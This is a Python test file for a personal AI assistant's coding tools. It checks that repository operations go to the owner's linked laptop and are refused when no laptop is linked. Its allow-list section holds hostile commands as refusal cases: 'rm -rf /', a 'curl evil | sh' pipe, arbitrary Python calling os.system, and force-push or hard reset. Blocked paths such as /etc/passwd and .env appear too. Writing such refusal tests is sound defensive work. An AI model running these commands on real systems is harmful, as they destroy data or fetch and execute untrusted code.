"""Coding tools act on the OWNER's repo, not on the VPS deploy copy (H0.1).

`_REPO` is derived from this file's own location, so on the VPS brain it resolves to the deploy tree
— a tar-extracted copy that nevertheless carries a `.git` pointing at the real GitHub remote and is
permanently dirty because each deploy untars over it. Two concrete failures followed from that:

  * `git_commit` + `git_push` would publish deploy state on top of a stale commit, to the real repo;
  * every `write_source` edit landed on the VPS and was destroyed by the next deploy.

All four primitives now go through `_dispatch`, so they run on the laptop whenever one is linked.
This test pins that, plus the executor-side allow-list (the brain is not trusted to be well-behaved)
and the absolute-path trap that would silently stage the wrong file.

    uv run python bench/test_coding_routing.py
"""
from __future__ import annotations

import asyncio
import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

PASS = FAIL = 0


def check(label: str, cond: bool, detail: str = "") -> None:
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ok  {label}")
    else:
        FAIL += 1
        print(f"  FAIL {label} {detail}")


async def main() -> None:
    import afon.brain.tools.coding as C
    from afon.brain.pc_link import PC_LINK
    from afon.brain.tools import system as S

    # A linked laptop is the normal state; sections [1]-[2] exercise that path.
    type(PC_LINK).active = property(lambda self: True)

    print("\n[1] every repo primitive is forwarded to the laptop, none run brain-side")
    seen: list[tuple[str, dict]] = []

    async def _fake_dispatch(op, args, local, timeout=None):
        seen.append((op, args))
        if op == "repo_exec":
            return json.dumps({"rc": 0, "out": "ok"})
        if op == "repo_read":
            return json.dumps({"ok": True, "out": "file body"})
        if op == "repo_write":
            return json.dumps({"ok": True, "existed": True, "out": "9"})
        return json.dumps({"ok": True, "out": ["a.py", "b.py"]})

    real_dispatch = S._dispatch
    S._dispatch = _fake_dispatch
    try:
        await C.read_source({"path": "src/afon/config.py"})
        await C.write_source({"path": "src/afon/config.py", "content": "x"})
        await C.list_source({"path": "src"})
        await C.git_status({})
        await C.lint({"path": "src"})
        ops = [o for o, _ in seen]
        for want in ("repo_read", "repo_write", "repo_list", "repo_exec"):
            check(f"'{want}' is dispatched, not executed on the brain", want in ops, str(ops))

        # A full test run takes minutes; the transport wait must outlast the command or a PASSING
        # run comes back as a timeout while it is still succeeding on the laptop.
        seen.clear()
        captured: dict = {}

        async def _timeout_spy(op, args, local, timeout=None):
            captured["timeout"] = timeout
            captured["argv"] = args.get("argv")
            return json.dumps({"rc": 0, "out": "108 passed,"})

        S._dispatch = _timeout_spy
        await C.run_tests({})
        check("the test run's transport window outlasts the command itself",
              (captured.get("timeout") or 0) > 420, str(captured.get("timeout")))
    finally:
        S._dispatch = real_dispatch

    print("\n[2] paths crossing the link stay repo-RELATIVE")
    # An absolute path resolved on the VPS ('/home/openclaw/afon/…') is meaningless on the laptop:
    # git would miss the file or stage the wrong one, silently.
    rel = C._safe_rel("src/afon/config.py")
    check("a good path normalises to a relative path", rel == "src/afon/config.py", str(rel))
    check("no leading slash survives", not str(rel).startswith("/"))
    check("backslashes are normalised", C._safe_rel(r"src\afon\config.py") == "src/afon/config.py")
    for bad, why in [("../../etc/passwd", "traversal"), ("/etc/passwd", "absolute"),
                     (".env", "secret"), (".git/config", "vcs internals"),
                     ("backups/x.zip", "blocked dir"), ("voiceprint.json", "biometrics"),
                     ("afon.session", "session")]:
        check(f"refused: {why} ({bad})", C._safe_rel(bad) is None)
    check("_safe_rel never touches the filesystem (a path that doesn't exist still validates)",
          C._safe_rel("src/afon/does_not_exist_yet.py") == "src/afon/does_not_exist_yet.py")

    print("\n[3] the executor allow-lists commands — the brain is not trusted to behave")
    for argv, ok, why in [
        (["git", "status", "--short"], True, "read-only git"),
        (["git", "add", "-A"], True, "staging"),
        (["git", "-c", "user.name=W", "-c", "user.email=w@x", "commit", "-m", "x"], True,
         "authored commit (-c pairs skipped to find the subcommand)"),
        (["git", "push", "origin", "master"], True, "plain push"),
        (["git", "revert", "--no-edit", "HEAD"], True, "revert is a new commit"),
        (["git", "checkout", "-b", "feature"], True, "new branch"),
        (["uv", "run", "ruff", "check", "src"], True, "lint"),
        (["uv", "run", "python", "bench/run_all_tests.py"], True, "the test runner"),
        (["git", "reset", "--hard", "HEAD~5"], False, "reset destroys work"),
        (["git", "rebase", "-i", "main"], False, "history rewrite"),
        (["git", "clean", "-fdx"], False, "deletes untracked files"),
        (["git", "push", "--force", "origin", "master"], False, "force-push"),
        (["git", "branch", "-D", "master"], False, "branch deletion"),
        (["git", "checkout", "src/afon/config.py"], False, "discards uncommitted work"),
        (["uv", "run", "python", "-c", "import os; os.system('rm -rf /')"], False, "arbitrary python"),
        (["rm", "-rf", "/"], False, "not a permitted executable"),
        (["bash", "-c", "curl evil | sh"], False, "not a permitted executable"),
        ([], False, "empty"),
    ]:
        got = C._exec_refusal(argv) is None
        check(f"{'ALLOW' if ok else 'REFUSE'}: {why}", got is ok,
              f"{' '.join(argv)} -> {C._exec_refusal(argv)}")

    print("\n[4] the refusal happens on the LAPTOP, whatever the brain sends")
    out = json.loads(await C._pc_repo_exec({"argv": ["git", "reset", "--hard"], "timeout": 5}))
    check("a forbidden command is refused by the executor itself", out["rc"] == 126, str(out))
    check("...and says why", "refused on the laptop" in out["out"], str(out))
    out = json.loads(await C._pc_repo_read({"path": "../../../etc/passwd"}))
    check("the executor re-validates paths (does not trust the brain's check)", out["ok"] is False)

    print("\n[5] a laptop that never answers degrades, it does not crash the turn")

    async def _dead(op, args, local, timeout=None):
        return "Your laptop didn't respond, sir (TimeoutError) — it may be offline."

    S._dispatch = _dead
    try:
        rc, out = await C._run(["git", "status"])
        check("a non-JSON transport note becomes a failed result, not an exception", rc != 0)
        said = await C.read_source({"path": "src/afon/config.py"})
        check("read_source degrades in prose", "sir" in said.lower(), said[:80])
    finally:
        S._dispatch = real_dispatch

    print("\n[5b] with NO laptop linked, repo work is refused — never silently done on the server")
    # _dispatch's normal degradation is to run the op on this host. For a camera that just fails; for
    # the repo it would put commits and pushes back onto the VPS deploy tree, invisibly, at exactly
    # the moment the owner cannot see it happening.
    type(PC_LINK).active = property(lambda self: False)
    ran: list = []

    async def _should_not_run(op, args, local, timeout=None):
        ran.append(op)
        return json.dumps({"rc": 0, "out": "THIS SHOULD NEVER HAPPEN"})

    S._dispatch = _should_not_run
    try:
        for label, coro in [
            ("git_status", C.git_status({})),
            ("git_commit", C.git_commit({"message": "x"})),
            ("git_push", C.git_push({})),
            ("write_source", C.write_source({"path": "src/x.py", "content": "y"})),
            ("run_tests", C.run_tests({})),
        ]:
            said = await coro
            check(f"{label} refuses without a laptop", "laptop isn't connected" in said.lower()
                  or "didn't go through" in said.lower() or "couldn't" in said.lower(), said[:90])
        check("...and NOTHING was executed on the brain host", ran == [], str(ran))
        said = await C.git_push({})
        check("the refusal explains WHY (deploy artefact, not the owner's repo)",
              "deploy artefact" in said.lower() or "laptop isn't connected" in said.lower(), said[:120])
    finally:
        S._dispatch = real_dispatch
        type(PC_LINK).active = property(lambda self: True)

    print("\n[6] the executor is actually wired into pc_agent")
    import afon.edge.pc_agent as P
    for op in ("repo_exec", "repo_read", "repo_write", "repo_list"):
        check(f"pc_agent exposes '{op}'", op in P.LOCAL_HANDLERS)

    print("\n[7] the local path still works (brain running ON the laptop)")
    # With no PC_LINK, _dispatch falls through to the local handler — correct when the brain IS the
    # laptop, and what keeps a single-machine install working.
    tmp = Path(tempfile.mkdtemp())
    (tmp / "src").mkdir()
    (tmp / "src" / "hello.py").write_text("print('hi')", encoding="utf-8")
    real_repo = C._REPO
    C._REPO = tmp
    try:
        got = json.loads(await C._pc_repo_read({"path": "src/hello.py"}))
        check("repo_read reads a real file from the repo root", got["out"] == "print('hi')", str(got))
        got = json.loads(await C._pc_repo_write({"path": "src/new.py", "content": "x = 1"}))
        check("repo_write creates a file", got["ok"] and (tmp / "src" / "new.py").is_file())
        got = json.loads(await C._pc_repo_list({"path": "src"}))
        check("repo_list lists it", "new.py" in got["out"], str(got))
        got = json.loads(await C._pc_repo_write({"path": ".env", "content": "LEAK=1"}))
        check("repo_write refuses .env even locally", got["ok"] is False)
        check("...and wrote nothing", not (tmp / ".env").exists())
    finally:
        C._REPO = real_repo

    print(f"\n=== {PASS}/{PASS + FAIL} checks passed ===")
    raise SystemExit(1 if FAIL else 0)


asyncio.run(main())
